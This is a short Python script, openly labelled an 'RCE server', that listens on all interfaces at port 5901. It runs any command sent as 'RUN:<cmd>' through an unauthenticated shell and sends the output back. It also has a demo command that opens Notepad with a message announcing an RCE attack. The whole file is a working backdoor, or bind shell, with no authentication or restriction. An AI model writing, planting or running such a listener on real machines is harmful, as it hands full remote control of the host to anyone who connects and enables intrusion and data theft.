import socket
import os
import subprocess
import tempfile

HOST = '0.0.0.0'
PORT = 5901

def execute_command(cmd):
    print(f"[RCE] Executing: {cmd}")

    if cmd == "notepad_message":
        try:
            # Step 1: Create a temp file with a message
            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8") as f:
                f.write("This is an RCE attack. \n Your Server is insecure") # custom message
                temp_file_path = f.name

            # Step 2: Open Notepad with the file
            subprocess.Popen(["notepad", temp_file_path])
            return f"Opened Notepad with message at {temp_file_path}"

        except Exception as e:
            return f"Failed to launch Notepad with message: {e}"

    else:
        # Fallback: run as regular shell command
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)

def start_server():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] RCE server listening on {HOST}:{PORT}")

    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    while True:
        data = conn.recv(1024).decode()
        if not data:
            break

        print(f"[>] Received: {data}")

        if data.startswith("RUN:"):
            command = data[4:].strip()
            output = execute_command(command)
            conn.sendall(f"[OUTPUT]\n{output}".encode())
        else:
            conn.sendall(b"[!] Invalid command format. Use RUN:<cmd>\n")

    conn.close()

if __name__ == "__main__":
    start_server()